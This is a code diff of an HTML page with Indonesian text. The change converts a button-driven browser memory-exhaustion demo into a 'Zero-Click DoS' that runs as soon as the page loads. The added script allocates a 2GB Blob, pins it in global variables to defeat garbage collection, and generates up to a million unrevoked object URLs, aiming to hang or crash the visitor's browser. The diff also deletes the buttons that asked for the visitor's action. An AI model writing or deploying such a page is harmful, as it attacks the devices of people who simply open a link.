@@ -3,82 +3,62 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Client-Side DoS (Memory Exhaustion)</title>
+<title>Zero-Click Memory Exhaustion</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
 .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
-h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
+h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; animation: pulse 0.5s infinite; }
 p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; margin-bottom: 10px; }
-button:hover { background: #b71c1c; }
-button:disabled { background: #555; }
 #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
 .warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
 .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
+@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <div class="warning">⚠️ PERINGATAN: Klik tombol di bawah akan memicu Memory Exhaustion. Browser Anda akan HANG atau CRASH total!</div>
-    <h1>Client-Side DoS</h1>
-    <p>Membuat Blob raksasa dan jutaan ObjectURL tanpa revoke.</p>
+    <div class="warning">⚠️ PERINGATAN: Halaman ini akan langsung memicu Memory Exhaustion saat dibuka!</div>
+    <h1>Zero-Click DoS</h1>
+    <p>Membuat Blob raksasa dan jutaan ObjectURL tanpa henti.</p>
     
-    <button id="btn-blob" type="button">1. Blob Raksasa (2GB)</button>
-    <button id="btn-url" type="button">2. Jutaan ObjectURL (Leak)</button>
-    
-    <div id="status" role="status">Sistem siap.</div>
+    <div id="status" role="status">Memuat halaman...</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
 </div>
 
 <script>
     const statusDiv = document.getElementById("status");
     const logDiv = document.getElementById("log");
-    let isRunning = false;
 
     function log(msg) {
         logDiv.innerHTML += "<br>> " + msg;
         console.log(msg);
     }
 
-    // 1. Blob Raksasa (Memory Bombing)
-    document.getElementById("btn-blob").addEventListener("click", () => {
-        if (isRunning) return;
-        isRunning = true;
-        document.getElementById("btn-blob").disabled = true;
-        document.getElementById("btn-url").disabled = true;
-        
-        statusDiv.textContent = "Membuat Blob 2GB...";
-        log("Memulai alokasi RAM 2GB...");
+    // FUNGSI ZERO-CLICK: Langsung eksekusi saat halaman dimuat
+    window.addEventListener("DOMContentLoaded", () => {
+        statusDiv.textContent = "MEMULAI SERANGAN DoS...";
+        statusDiv.style.color = "#ff4444";
+        log("Halaman dimuat. Memulai alokasi memori masif...");
 
-        // Alokasi 2GB RAM
-        const sizeInBytes = 2 * 1024 * 1024 * 1024; // 2GB
+        // --- SERANGAN 1: Blob Raksasa (2GB) ---
         try {
+            const sizeInBytes = 2 * 1024 * 1024 * 1024; // 2GB
             const buffer = new ArrayBuffer(sizeInBytes);
             const blob = new Blob([buffer], { type: 'application/octet-stream' });
             const url = URL.createObjectURL(blob);
             
-            log("Blob 2GB berhasil dibuat.");
-            statusDiv.textContent = "Blob 2GB dibuat! Cek apakah browser crash.";
-            statusDiv.style.color = "#4CAF50";
+            // Simpan di global agar tidak di-GC
+            window.hugeBlob = blob;
+            window.hugeBlobUrl = url;
+            
+            log("Blob 2GB berhasil dialokasikan.");
         } catch (e) {
-            log("Gagal alokasi: " + e.message);
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
+            log("Gagal alokasi Blob 2GB: " + e.message);
         }
-    });
 
-    // 2. Jutaan ObjectURL (Memory Leak)
-    document.getElementById("btn-url").addEventListener("click", () => {
-        if (isRunning) return;
-        isRunning = true;
-        document.getElementById("btn-blob").disabled = true;
-        document.getElementById("btn-url").disabled = true;
-        
-        statusDiv.textContent = "Membuat jutaan ObjectURL...";
-        log("Memulai pembuatan ObjectURL tanpa revoke...");
-
+        // --- SERANGAN 2: Jutaan ObjectURL (Memory Leak) ---
         let count = 0;
         const targetCount = 1000000; // 1 Juta URL
 
@@ -113,6 +93,7 @@ button:disabled { background: #555; }
             }
         }
 
+        // Mulai Memory Leak
         createURL();
     });
 </script>
